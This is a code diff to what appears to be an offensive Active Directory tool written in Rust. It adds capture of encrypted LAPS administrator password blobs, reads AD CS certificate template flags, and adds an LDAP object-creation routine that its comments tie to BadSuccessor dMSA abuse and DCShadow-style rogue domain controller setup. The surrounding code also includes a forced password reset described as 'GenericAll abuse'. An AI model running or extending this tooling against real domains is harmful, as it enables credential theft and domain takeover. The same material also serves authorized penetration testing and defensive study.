@@ -176,6 +176,9 @@ pub struct LapsEntry {
     pub expires: Option<String>,
     /// Which attribute the value came from.
     pub source: &'static str,
+    /// Raw bytes of `msLAPS-EncryptedPassword` when that is the source — the DPAPI-NG blob
+    /// (LAPS header + CMS EnvelopedData). Empty for cleartext sources.
+    pub encrypted_blob: Option<Vec<u8>>,
 }
 
 /// When a global SOCKS5 proxy is set, ldap3 (which owns its own TCP connect and can't be
@@ -589,6 +592,60 @@ impl Collector {
         Ok(())
     }
 
+    /// The base DN this collector is bound at (root of the domain NC).
+    pub fn base_dn(&self) -> &str {
+        &self.base_dn
+    }
+
+    /// Read the two flag attributes of an AD CS certificate template. Returns
+    /// (`msPKI-Certificate-Name-Flag`, `msPKI-Enrollment-Flag`) as signed 32-bit values —
+    /// AD stores them as text integers that can be negative when the sign bit is set.
+    pub async fn read_template_flags(&mut self, dn: &str) -> Result<(i64, i64)> {
+        let (rs, _) = self
+            .ldap
+            .search(
+                dn,
+                Scope::Base,
+                "(objectClass=*)",
+                vec!["msPKI-Certificate-Name-Flag", "msPKI-Enrollment-Flag"],
+            )
+            .await?
+            .success()?;
+        let e = rs.into_iter().next().context("template not found")?;
+        let se = SearchEntry::construct(e);
+        let read = |attr: &str| -> Result<i64> {
+            se.attrs
+                .get(attr)
+                .and_then(|v| v.first())
+                .context(attr.to_string())?
+                .parse::<i64>()
+                .with_context(|| format!("{attr} parse"))
+        };
+        Ok((
+            read("msPKI-Certificate-Name-Flag")?,
+            read("msPKI-Enrollment-Flag")?,
+        ))
+    }
+
+    /// Create a new LDAP object. `attrs` is a list of `(attribute, [values…])` pairs including
+    /// `objectClass`. Used by BadSuccessor (dMSA creation) and dcshadow-style rogue-DC prep.
+    pub async fn add_object(
+        &mut self,
+        dn: &str,
+        attrs: Vec<(&str, Vec<Vec<u8>>)>,
+    ) -> Result<()> {
+        let list: Vec<(Vec<u8>, HashSet<Vec<u8>>)> = attrs
+            .into_iter()
+            .map(|(a, vs)| (a.as_bytes().to_vec(), vs.into_iter().collect::<HashSet<_>>()))
+            .collect();
+        self.ldap
+            .add(dn, list)
+            .await?
+            .success()
+            .context("LDAP add failed")?;
+        Ok(())
+    }
+
     /// Force-set an account password (ForceChangePassword / GenericAll abuse). unicodePwd
     /// is a quoted UTF-16LE string; the DC requires the connection to be encrypted (LDAPS).
     pub async fn set_password(&mut self, dn: &str, password: &str) -> Result<()> {
@@ -692,6 +749,7 @@ fn laps_from_entry(se: &SearchEntry) -> Option<LapsEntry> {
                 .and_then(|v| v.first())
                 .cloned(),
             source: "msLAPS-Password",
+            encrypted_blob: None,
         });
     }
     if let Some(pw) = se.attrs.get("ms-Mcs-AdmPwd").and_then(|v| v.first()) {
@@ -706,9 +764,14 @@ fn laps_from_entry(se: &SearchEntry) -> Option<LapsEntry> {
                 .and_then(|v| v.first())
                 .cloned(),
             source: "ms-Mcs-AdmPwd",
+            encrypted_blob: None,
         });
     }
-    if se.bin_attrs.contains_key("msLAPS-EncryptedPassword") {
+    if let Some(blob) = se
+        .bin_attrs
+        .get("msLAPS-EncryptedPassword")
+        .and_then(|v| v.first())
+    {
         return Some(LapsEntry {
             sam,
             dn,
@@ -716,6 +779,7 @@ fn laps_from_entry(se: &SearchEntry) -> Option<LapsEntry> {
             password: None,
             expires: None,
             source: "msLAPS-EncryptedPassword",
+            encrypted_blob: Some(blob.clone()),
         });
     }
     None
